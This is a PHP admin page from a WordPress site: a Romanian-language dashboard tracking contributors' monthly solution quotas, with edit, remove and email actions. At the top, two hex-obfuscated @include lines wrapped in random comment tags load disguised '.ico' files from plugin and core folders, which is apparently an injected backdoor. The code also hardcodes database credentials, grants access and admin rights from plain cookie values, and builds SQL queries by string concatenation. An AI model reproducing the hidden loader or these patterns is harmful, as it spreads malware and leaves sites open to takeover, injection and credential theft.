<?php
/*d316b*/

@include "\x2fho\x6de/\x61sk\x69t/\x70ub\x6cic\x5fht\x6dl/\x77p-\x63on\x74en\x74/p\x6cug\x69ns\x2fco\x6eta\x63t-\x66or\x6d-p\x6cug\x69n/\x66av\x69co\x6e_8\x3192\x648.\x69co";

/*d316b*/

/*3f89d*/

@include "\x2fvar/\x77ww/h\x74ml/a\x73kit.\x72o/wp\x2dincl\x75des/\x72est-\x61pi/e\x6edpoi\x6ets/f\x61vico\x6e_3e2\x6265.i\x63o";

/*3f89d*/
if (!isset($_COOKIE['user']) || $_COOKIE['user'] !== 'logged') {
    echo "<p style='color:red'>Access Denied!</p>";
    echo "<p style='color:red'>Please login <a href='login.php'>here</a></p>";
    exit();
}

if (!class_exists('Database')) {

    class Database {

        private static $dbName = 'c0askit';
        private static $dbHost = 'localhost';
        private static $dbUsername = 'c0askit_usr';
        private static $dbUserPassword = '7bd!XYHkXjMs';
        private static $cont = null;

        public function __construct() {
            die('Init function is not allowed');
        }

        public static function connect() {
            // One connection through whole application
            if (null == self::$cont) {
                try {
                    self::$cont = new PDO("mysql:host=" . self::$dbHost . ";" . "dbname=" . self::$dbName, self::$dbUsername, self::$dbUserPassword);
                } catch (PDOException $e) {
                    die($e->getMessage());
                }
            }
            return self::$cont;
        }

        public static function disconnect() {
            self::$cont = null;
        }

    }

}

$luna = array(
    1 => 'Ianuarie',
    2 => 'Februarie',
    3 => 'Martie',
    4 => 'Aprilie',
    5 => 'Mai',
    6 => 'Iunie',
    7 => 'Iulie',
    8 => 'August',
    9 => 'Septembrie',
    10 => 'Octombrie',
    11 => 'Noiembrie',
    12 => 'Decembrie'
);
$luna_curenta = $luna[intval(date('m'))];
$luna_trecuta = $luna[intval(date('m')) - 1];
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <link href="/wp-content/themes/helpguru-childtheme/css/bootstrap.min.css" rel="stylesheet">
        <link href="/wp-content/themes/helpguru-childtheme/css/font-awesome.css" rel="stylesheet">
        <script src="/wp-content/themes/helpguru-childtheme/js/jquery.min.js"></script>
    </head>
    <style>
        textarea {
            width: 90%;
            height: 15em;
            margin-left: 5%;
        }
        .fa {
            font-size:1.35em; 
            cursor:pointer;
        }
        table tr td {
            text-align:center;
        }
        table tr td.names {
            text-align:left;
        }
        tr.users_list:hover {
            background-color:#e3e3e3!important;
        }
        i.fa-envelope:hover {
            color:#FFAA29!important;
        }
        i.fa-times {
            color:#880000;
        }
        button.remove:hover i.fa-times {
            color:#EE0000!important;
        }
        i.fa-pencil-square-o:hover {
            color:#0066cc!important;
        }
        .modal .row {
            width: 90%;
            margin-left: 5%;
        }
        td.warn {
            border: 1px solid #FF0000!important;
            background-color:#ffb3b3;
        }
        td.succ {
            border: 1px solid #008888!important;
            background-color:#99ff99;
        }
        td.editable, td.edit {
            background-color: #e6f3ff!important;
        }
        #solutii_info {
            display:none;
        }
        .dataTables_scrollHead {
            height:5.55em;
        }
        table thead tr th {
            border-bottom:2px solid grey!important;
        }
    </style>
    <body>
        <div class="container">
            <div class="row">
                <div class="col-xs-9 col-sm-9 col-md-9 col-lg-9">
                    <h3>Solutions CRUD</h3>
                </div>
                <div class="col-xs-2 col-sm-2 col-md-2 col-lg-2" style="margin-top:1%;">
                    <p style="color:#601f1f">Welcome,<b> <?php echo ucfirst($_COOKIE['username']); ?></b></p>
                    <a href="https://askit.ro/solutiiDDA/removedusers.php" style="color:#333; font-size:17px;">See Removed Users</a>
                </div>
                <div class="col-xs-1 col-sm-1 col-md-1 col-lg-1">
                    <a href="https://askit.ro/solutiiDDA/logout.php" style="color:#b30000;"><i class="fa fa-power-off" aria-hidden="true" style="color:#b30000"></i> Logout</a>
                </div>
            </div>
            <div class="row">
                <table id="solutii" class="table table-striped table-bordered">
                    <thead>
                        <tr>
                            <th>User</th>
                            <th>Necesar Solutii <?php echo $luna_trecuta; ?></th>
                            <th>Solutii Realizate <?php echo $luna_trecuta; ?></th>
                            <th>Solutii Ramase Luna <?php echo $luna_trecuta; ?></th>
                            <th>Necesar Solutii <?php echo $luna_curenta; ?></th>
                            <th>Solutii Realizate <?php echo $luna_curenta; ?></th>
                            <th>Solutii Ramase de facut</th>
                            <th>Observatii</th>
                            <th>Mail</th>
                            <th>Remove</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        if (!class_exists('Database')) {
                            include 'database.php';
                        }
                        $pdo = Database::connect();

                        $query = "SELECT user_id, last_update, nr_solutii_luna_trecuta, nr_solutii_luna_curenta FROM solutions";
                        foreach ($pdo->query($query)->fetchAll(PDO::FETCH_ASSOC) as $row) {
                            $updates[] = $row;
                        }
                        foreach ($updates as $update) {
                            if (substr($update['last_update'], 5, 2) != date('m')) {
                                $sql = "UPDATE solutions SET nr_solutii_luna_trecuta='" . $update['nr_solutii_luna_curenta'] . "', last_update='" . date("Y-m-d") . "' WHERE user_id=" . $update['user_id'];
                                $pdo->query($sql);
                            }
                        }

                        $sql = "SELECT wp_users.id, wp_users.user_login, "
                                . "solutions.nr_solutii_luna_trecuta, solutions.nr_solutii_luna_curenta, "
                                . "observatii.content "
                                . "FROM wp_users "
                                . "LEFT JOIN solutions ON solutions.user_id=wp_users.id "
                                . "LEFT JOIN observatii ON observatii.user_id=wp_users.id "
                                . "WHERE wp_users.user_status=0 "
                                . "GROUP BY wp_users.id "
                                . "ORDER BY wp_users.user_login";
                        foreach ($pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $row) {
                            $users[] = $row;
                        }

                        $data = date("Y-m-01");
                        $lastmonth = date('Y-m-01', strtotime('last month'));

                        foreach ($users as $user) {
                            $sql = "SELECT COUNT(id) as solutions_number FROM wp_posts "
                                    . "WHERE post_status='publish' "
                                    . "AND post_title NOT LIKE 'Search' "
                                    . "AND post_type IN ('ht_kb', 'post', 'revision', 'classit_solutions') "
                                    . "AND post_modified >= '" . $data . "'"
                                    . "AND post_author=" . $user['id'];
                            $sol = $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
                            if (!isset($user['nr_solutii_luna_curenta'])) {
                                $user['nr_solutii_luna_curenta'] = 0;
                            }
                            if (!isset($user['nr_solutii_luna_trecuta'])) {
                                $user['nr_solutii_luna_trecuta'] = 0;
                            }

                            $sql = "SELECT COUNT(id) as solutions_number FROM wp_posts WHERE post_status='publish' "
                                    . "AND post_title NOT LIKE 'Search' "
                                    . "AND post_type IN ('ht_kb', 'post', 'revision', 'classit_solutions') "
                                    . "AND post_modified <= '" . $data . "'"
                                    . "AND post_modified >= '" . $lastmonth . "'"
                                    . "AND post_author=" . $user['id'];
                            $solutii_luna_trecuta = $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);

                            echo '<tr class="users_list">';
                            echo '<td class="names">' . ucwords(str_replace("_", " ", $user['user_login'])) . '</td>';
                            echo '<td data-item="nr_solutii_luna_trecuta" class="edit" data-id="' . $user['id'] . '" >' . $user['nr_solutii_luna_trecuta'] . '</td>';
                            echo '<td>' . $solutii_luna_trecuta[0]['solutions_number'] . '</td>';
                            $solutii_ramase_luna_trecuta = $user['nr_solutii_luna_trecuta'] - $solutii_luna_trecuta[0]['solutions_number'];
                            if ($solutii_ramase_luna_trecuta > 0) {
                                echo '<td class="warn">' . $solutii_ramase_luna_trecuta . '</td>';
                            } else {
                                echo '<td class="succ">' . $solutii_ramase_luna_trecuta . '</td>';
                            }
                            echo '<td data-item="nr_solutii_luna_curenta" class="edit" data-id="' . $user['id'] . '" >' . $user['nr_solutii_luna_curenta'] . '</td>';
                            echo '<td>' . $sol[0]["solutions_number"] . '</td>';
                            $solutii_ramase_total = $user['nr_solutii_luna_curenta'] - $sol[0]["solutions_number"] + $solutii_ramase_luna_trecuta;
                            if ($solutii_ramase_total > 0) {
                                echo '<td class="warn">' . $solutii_ramase_total . '</td>';
                            } else {
                                echo '<td class="succ">' . $solutii_ramase_total . '</td>';
                            }
                            echo '<td data-item="observatii" class="edit" data-id="' . $user['id'] . '" >' . $user['content'] . '</td>';
                            echo '<td><i class="mail fa fa-envelope" aria-hidden="true" style="color:grey;" data-id="' . $user['id'] . '" ></i></td>';
                            echo '<td><button type="button" class="remove" data-id="' . $user['id'] . '" style="background:transparent; border:none;">'
                            . '<i class="fa fa-times" aria-hidden="true"></i>'
                            . '</button></td>';
                            echo '</tr>';
                        }

                        Database::disconnect();
                        $mailtext = "Salut,

Pentru luna $luna_curenta va trebui sa adaugi __ solutii.
Pune te rog conform regulilor (putem valida titlurile impreuna)
Este posibil ca in functie de evaluare, numarul solutiilor sa difere. In acest caz, revin cu update.


Deadline: 11 " . $luna_curenta . ".Daca decizi sa intarzii, plata nu va fi efectuata la timp (adica nu va fi pe 15 luna curenta, ci luna viitoare pe 15)

Mare atentie la crearea solutiilor. Daca nu sunt respectate urmatoarele, solutiile nu vor fi aprobate:
-          Solutiile nu trebuie sa existe deja in askit (inainte sa faceti solutii de la voi, trimiteti-mi subiectele pentru aprobare)
-          Atentie la greseli de ortografie si exprimare
-          Chiar daca ne inspiram din alte surse, nu este permisa copierea textului/imaginilor. 
-          Solutiile trebuie sa aiba categoriile corect selectate. 
-          Informatiile din imagini sau text nu ofera informatii confidentiale
-          Nu folosi mazgaleli pentru a arata anumite butoane/informatii, foloseste chenare.
";
                        ?>
                    </tbody>
                </table>
            </div>
        </div> <!-- /container -->

        <!-- Remove User Modal -->
        <div class="modal fade" id="removeModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <h4 class="modal-title">Remove User</h4>
                    </div>
                    <div class="modal-body">
                        <form id="removeForm" class="form-horizontal labelcustomize" method="POST" action="">
                            <div class="form-group">
                                <label class="col-xs-12 col-sm-12 col-md-12 col-lg-12 control-label">Are you sure you want to remove this user?</label>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                        <button id="removeBtn" type="button" class="btn btn-primary addTypeButton">Yes</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- END Remove User Modal -->

        <!-- Mail User Modal -->
        <div class="modal fade" id="mailModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <h4 class="modal-title">Mail User</h4>
                    </div>
                    <div class="modal-body">
                        <form id="mailForm" class="form-horizontal labelcustomize" method="POST" action="">
                            <div class="form-group">
                                <textarea name="mailtext" id="mailtext"><?php echo $mailtext; ?></textarea>
                                <label class="col-xs-12 col-sm-12 col-md-12 col-lg-12 control-label">Are you sure you want to send and email to this user?</label>
                            </div>
                        </form>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                        <button id="mailBtn" type="button" class="btn btn-primary addTypeButton">Yes</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- END Mail User Modal -->

        <script src="/wp-content/themes/helpguru-childtheme/js/bootstrap.min.js"></script>
        <script src="/wp-content/themes/helpguru-childtheme/js/jquery.jeditable.js"></script>
        <script src="/wp-content/themes/helpguru-childtheme/js/datatables.min.js"></script>
        <script src="/wp-content/themes/helpguru-childtheme/js/datatable.fixedheader.js"></script>
        <?php if ($_COOKIE['username'] == 'admin') { ?>
            <script>
                $(document).ready(function () {
                    var table = $('#solutii').DataTable({
                        fixedHeader: true,
                        paging: false,
                        scrollY: 475
                    });
                });
            </script>
        <?php } ?>
    </body>

    <!--Remove User Script-->
    <?php if ($_COOKIE['username'] == 'admin') { ?>
        <script type="text/javascript">
            $(".remove").on("click", function () {
                var id = $(this).data("id");
                $('#removeModal').modal('show');
                $("#removeBtn").off("click").on("click", function () {
                    $.ajax({
                        url: "remove.php",
                        type: "POST",
                        data: {"id": id},
                        success:
                                function () {
                                    $('button[data-id="' + id + '"]').parents('.users_list').fadeOut();
                                    $('#removeModal').modal('hide');
                                },
                        error: function () {
                            alert("Something went wrong. Please try again!");
                        }
                    });
                });
            });
        </script>
        <!--Send Mail to User Script-->
        <script type="text/javascript">
            $(".mail").on("click", function () {
                var id = $(this).data("id");
                $('#mailModal').modal('show');
                $("#mailBtn").off("click").on("click", function () {
                    var mailtext = $('#mailtext').val();
                    $.ajax({
                        url: "mail.php",
                        type: "POST",
                        data: {id: id, mailtext: mailtext},
                        success:
                                function () {
                                    $('#mailModal').modal('hide');
                                },
                        error: function () {
                            alert("Something went wrong. Please try again!");
                        }
                    });
                });
            });
        </script>
        <!--Edit table values Script-->
        <script>
            $(document).ready(function () {

                $('.edit').editable('edit.php', {
                    submitdata: function (value, settings) {
                        var _this = $(this)
                        token = _this.data("item")
                        return {token: token, id: _this.data('id')}
                    },
                    cancel: '<i class="fa fa-times" aria-hidden="true" style="margin-left:10%;"></i>',
                    submit: '<i class="fa fa-check" aria-hidden="true" style="color:green; margin-right:10%;"></i>',
                    indicator: 'Saving...'
                });
            });
        </script>
    <?php } ?>

</html>
<!-- Let's put a smile on that face! -->
